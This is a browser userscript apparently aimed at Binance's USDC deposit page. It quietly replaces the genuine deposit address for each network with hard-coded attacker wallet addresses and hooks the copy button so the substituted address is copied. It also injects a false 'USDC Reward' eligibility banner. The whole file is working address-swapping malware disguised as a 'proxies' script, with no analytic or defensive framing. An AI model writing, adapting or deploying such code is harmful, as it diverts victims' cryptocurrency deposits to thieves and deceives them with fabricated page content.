// ==UserScript==
// @name         Binance Phillippines Proxies
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Заменя депозит адреса на Binance според избраната мрежа (BSC/SOL)
// @match        https://www.binance.com/en/my/wallet/account/main/deposit/crypto/USDC*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    let currentCopyBtn = null;

    const addressMap = {
        'BSC': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'SOL': 'D6cGJbVHN6SdWDRsuusfq3Kp8WG1h2Qq6bzDd72xggEP',
        'ETH': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'BASE': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'MATIC': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'ARBITRUM': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'XLM': 'Please use another Deposit method',
        'APT': '0x5534510c11cd8faf4154b08fcc7699d16c6109811e2e66afcd1769867dfe469f',
        'SUI': '0x66021c954f9881836fb627faf46067dc719c88020cf12595d63cceff5788e585',
        'AVAXC': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'OPTIMISM': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'SONIC': 'Please use another Deposit method',
        'RON': 'ronin:b638619dc1fbf516ad9f771691be2aee132fa59d',
        'NEAR': '22d390132bdf23159a1f3b6ab7d1fc19b0777ca1b2d63b50b66cd29a96af2e04',
        'HBAR': 'Please use another Deposit method',
        'ALGO': 'Please use another Deposit method',
        'ZKSYNCERA': '0xb638619dc1fbf516ad9f771691be2aee132fa59d',
        'STATEMINT': 'Please use another Deposit method',
        'CELO': 'CELO ADDRESS SUCCESS'
    };

    function replaceAddress() {
        let targetAddr = document.querySelector('.typography-subtitle2.break-all.text-t-Primary');
        if (!targetAddr) return;

        let networkEl = document.querySelector('.select-box .typography-subtitle1 .text-t-Primary');
        if (!networkEl) return;

        let network = networkEl.textContent.trim().toUpperCase();
        let newAddress = addressMap[network] || null;

        if (newAddress && targetAddr.textContent.trim() !== newAddress) {
            targetAddr.textContent = newAddress;
            console.log(`✅ Замествам адреса за ${network} с "${newAddress}"`);
        }
    }

    function attachCopyHandler() {
        let copyBtn = document.querySelector('#deposit_crypto_address_copy');
        if (!copyBtn) return;

        if (copyBtn !== currentCopyBtn) {
            currentCopyBtn = copyBtn;

            copyBtn.addEventListener('click', () => {
                let targetAddr = document.querySelector('.typography-subtitle2.break-all.text-t-Primary');
                if (!targetAddr) return;

                let textToCopy = targetAddr.textContent.trim();
                navigator.clipboard.writeText(textToCopy).then(() => {
                    console.log(`📋 Копирано: ${textToCopy}`);
                }).catch(err => {
                    console.error('❌ Грешка при копирането:', err);
                });
            });

            console.log('🔄 Бутонът за копиране е прихванат (нов елемент).');
        }
    }

    function insertContractInfo() {
        let container = document.querySelector('.bn-step-content-desc');
        if (!container) return;

        // Проверяваме дали вече сме го добавили
        if (container.querySelector('.custom-contract-info')) return;

        let infoDiv = document.createElement('div');
        infoDiv.className = 'custom-contract-info';
        infoDiv.style.color = '#FFA500'; // жълто-оранжев
        infoDiv.style.marginTop = '8px';
        infoDiv.textContent = 'You are eligible for USDC Reward task from Reward Hub Section';

        container.appendChild(infoDiv);
        console.log('🆕 Добавено "Contract address ending in" под bn-step-content-desc');
    }

    const observer = new MutationObserver(() => {
        replaceAddress();
        attachCopyHandler();
        insertContractInfo();
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    console.log('🚀 Скриптът за всички мрежи + contract info е стартиран...');
})();





